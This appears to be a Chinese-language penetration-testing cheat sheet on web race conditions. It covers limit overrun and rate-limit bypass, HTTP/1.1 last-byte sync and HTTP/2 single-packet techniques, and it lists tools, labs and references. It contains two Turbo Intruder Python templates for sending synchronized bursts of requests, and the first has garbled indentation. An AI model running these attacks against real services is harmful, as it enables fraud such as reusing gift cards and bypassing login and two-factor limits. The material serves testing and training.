# 竞态条件

> 当进程在关键或意外的情况下依赖于其他事件的顺序或时间时，可能会发生竞态条件。在Web应用程序环境中，多个请求可以在给定时间内同时处理，开发人员可能让并发由框架、服务器或编程语言来处理。

## 概要

- [工具](#工具)
- [方法论](#方法论)
    - [限制超限](#限制超限)
    - [绕过速率限制](#绕过速率限制)
- [技术](#技术)
    - [HTTP/1.1 最后字节同步](#http11-最后字节同步)
    - [HTTP/2 单包攻击](#http2-单包攻击)
- [Turbo Intruder](#turbo-intruder)
    - [示例 1](#示例-1)
    - [示例 2](#示例-2)
- [实验室](#实验室)
- [参考文献](#参考文献)

## 工具

- [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) - Burp Suite扩展，用于发送大量HTTP请求并分析结果。
- [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) - 使利用Web应用程序中的竞态条件变得高效且易于使用。
- [nxenon/h2spacex](https://github.com/nxenon/h2spacex) - 基于Scapy的HTTP/2单包攻击低级库/工具‌ + 利用时序攻击的漏洞利用工具。

## 方法论

### 限制超限

限制超限是指多个线程或进程竞争更新或访问共享资源的情景，导致资源超出其预期限制。

**示例**: 超支限额、多次投票、多次使用礼品卡。

- [竞态条件允许多次兑换礼品卡，导致免费“金钱” - @muon4](https://hackerone.com/reports/759247)
- [竞态条件可以用来绕过邀请限额 - @franjkovic](https://hackerone.com/reports/115007)
- [使用一个邀请注册多个用户 - @franjkovic](https://hackerone.com/reports/148609)

### 绕过速率限制

当攻击者利用速率限制机制中缺乏适当同步的问题以超过预期的请求数量限制时，就会发生速率限制绕过。速率限制旨在控制操作频率（例如API请求、登录尝试），但竞态条件可以让攻击者绕过这些限制。

**示例**: 绕过防暴力破解机制和双因素认证。

- [Instagram密码重置机制中的竞态条件 - Laxman Muthiyah](https://youtu.be/4O9FjTMlHUM)

## 技术

### HTTP/1.1 最后字节同步

发送所有请求，除了最后一个字节，然后通过发送最后一个字节“释放”每个请求。

使用Turbo Intruder执行最后字节同步

```py
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```

**示例**:

- [破解reCAPTCHA，Turbo Intruder风格 - James Kettle](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)

### HTTP/2 单包攻击

在HTTP/2中，您可以通过单个连接并发发送多个HTTP请求。在单包攻击中，大约20/30个请求将被发送，并且它们将在服务器端同时到达。使用单个请求消除了网络抖动。

- [PortSwigger/turbo-intruder/race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)
- Burp Suite
    - 向Repeater发送请求
    - 复制请求20次（Ctrl+R）
    - 创建一个新组并将所有请求添加到其中
    - 并行发送组（单包攻击）

**示例**:

- [CVE-2022-4037 - 使用单包攻击发现Gitlab中的竞态条件漏洞 - James Kettle](https://youtu.be/Y0NVIVucQNE)

## Turbo Intruder

### 示例 1

1. 将请求发送到Turbo Intruder
2. 使用此Python代码作为Turbo Intruder的负载

   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
       engine.queue(target.req, i)
           engine.queue(target.req, target.baseInput, gate='race1')


       engine.start(timeout=5)
   engine.openGate('race1')

       engine.complete(timeout=60)


   def handleResponse(req, interesting):
       table.add(req)
   ```

3. 现在设置外部HTTP头x-request: %s - :warning: 这是Turbo Intruder所需的
4. 点击“攻击”

### 示例 2

当需要在发送请求1后立即发送请求2，而窗口可能只有几毫秒时，可以使用以下模板。

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    '''

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)
def handleResponse(req, interesting):
    table.add(req)
```

## 实验室

- [PortSwigger - 限制超限竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
- [PortSwigger - 多端点竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [PortSwigger - 通过竞态条件绕过速率限制](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
- [PortSwigger - 多端点竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [PortSwigger - 单端点竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
- [PortSwigger - 利用时间敏感漏洞](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
- [PortSwigger - 部分构造竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)

## 参考文献

- [超越极限：通过首次序列同步扩展单包竞态条件以突破65,535字节限制 - @ryotkak - 2024年8月2日](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [DEF CON 31 - 打破状态机的真实潜力：Web竞态条件 - James Kettle (@albinowax) - 2023年9月15日](https://youtu.be/tKJzsaB1ZvI)
- [Web应用程序中竞态条件漏洞的利用 - Javan Rasokat - 2022年10月6日](https://conference.hitb.org/hitbsecconf2022sin/materials/D2%20COMMSEC%20-%20Exploiting%20Race%20Condition%20Vulnerabilities%20in%20Web%20Applications%20-%20Javan%20Rasokat.pdf)
- [Web竞态条件的新技术和工具 - Emma Stocks - 2023年8月10日](https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions)
- [Web应用中的竞态条件漏洞：案例研究 - Mandeep Jadon - 2018年4月24日](https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e)
- [Web上的竞态条件 - Josip Franjkovic - 2016年7月12日](https://www.josipfranjkovic.com/blog/race-conditions-on-web)
- [打破状态机：Web竞态条件的真正潜力 - James Kettle (@albinowax) - 2023年8月9日](https://portswigger.net/research/smashing-the-state-machine)
- [Turbo Intruder：拥抱十亿请求攻击 - James Kettle (@albinowax) - 2019年1月25日](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)